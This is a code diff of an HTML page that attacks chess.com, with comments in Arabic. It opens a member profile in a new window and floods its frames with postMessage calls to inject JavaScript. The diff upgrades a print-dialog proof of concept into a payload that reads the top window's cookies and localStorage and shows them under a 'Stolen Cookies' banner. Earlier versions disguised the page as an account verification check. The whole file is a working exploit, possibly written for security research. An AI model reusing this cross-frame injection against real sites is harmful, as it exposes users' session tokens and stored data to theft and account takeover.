@@ -2,61 +2,61 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Chess.com Account Verification</title>
+    <title>Chess.com Recon Attack</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f4;}
-        button { padding: 15px 30px; font-size: 20px; background-color: #3182ce; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        button:hover { background-color: #2b6cb0; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; }
+        button { padding: 15px 30px; font-size: 20px; background-color: #e53e3e; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>Chess.com Security Check</h1>
-    <p>Please click the button below to verify your account session.</p>
-    
-    <button onclick="startAttack()">Verify Account</button>
+    <h1>Chess.com FATO Recon</h1>
+    <button onclick="startAttack()">Extract Sensitive Data</button>
 
     <script>
-        // Payload الإثبات البصري (نافذة الطباعة)
-        let payload = "window.print(); // get_ext";
+        // Payload الاستطلاع: بيسحب الكوكيز واللوكال ستوريدج ويعرضهم في الصفحة الرئيسية
+        let payload = `
+            try {
+                let cookies = window.top.document.cookie;
+                let ls = JSON.stringify(window.top.localStorage);
+                
+                let attackHtml = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a202c;z-index:999999;color:#48bb78;font-family:monospace;padding:20px;overflow:auto;">';
+                attackHtml += '<h1>[+] FATO RECON SUCCESSFUL</h1>';
+                attackHtml += '<h3>[!] Stolen Cookies:</h3><textarea style="width:100%;height:100px;">' + cookies + '</textarea>';
+                attackHtml += '<h3>[!] Stolen LocalStorage:</h3><textarea style="width:100%;height:300px;">' + ls + '</textarea>';
+                attackHtml += '</div>';
+
+                window.top.document.body.innerHTML = attackHtml;
+            } catch(e) {}
+            // get_ext
+        `.replace(/\n/g, ''); 
+
         let spammer;
 
-        // دالة الضرب العنقودي (Recursion)
         function blastFrames(win) {
+            try { win.postMessage(payload, "*"); } catch(e) {}
             try {
-                win.postMessage(payload, "*");
-            } catch(e) {}
-            
-            try {
-                // الدخول للـ Iframes اللي جوه النافذة الجديدة
-                for (let i = 0; i < win.frames.length; i++) {
-                    blastFrames(win.frames[i]);
+                for (let i = 0; i < win.length; i++) {
+                    blastFrames(win[i]);
                 }
             } catch(e) {}
         }
 
-        // دالة الهجوم اللي بتشتغل لما الضحية يدوس على الزرار
         function startAttack() {
-            // 1. فتح الموقع في نافذة جديدة أو تاب جديدة
+            // استخدمت الصفحة دي لأن غالباً بيكون فيها إعلانات
             let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victimWindow");
 
-            // 2. نستنى 3 ثواني لحد ما الموقع يحمل إعلاناته
             setTimeout(() => {
-                console.log("Starting the blast...");
-                
-                // 3. نضرب النافذة الجديدة كل 10 ملي ثانية
+                // سبام كل 10 ملي ثانية
                 spammer = setInterval(() => {
-                    if(victimWin) {
-                        blastFrames(victimWin);
-                    }
+                    if(victimWin) blastFrames(victimWin);
                 }, 10);
 
-                // 4. نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
+                // زودنا وقت الضرب لـ 15 ثانية عشان نتغلب على تأخير التحميل
                 setTimeout(() => {
                     clearInterval(spammer);
-                    console.log("Blasting finished.");
-                }, 10000);
+                }, 15000);
 
-            }, 15000);
+            }, 2000);
         }
     </script>
 </body>
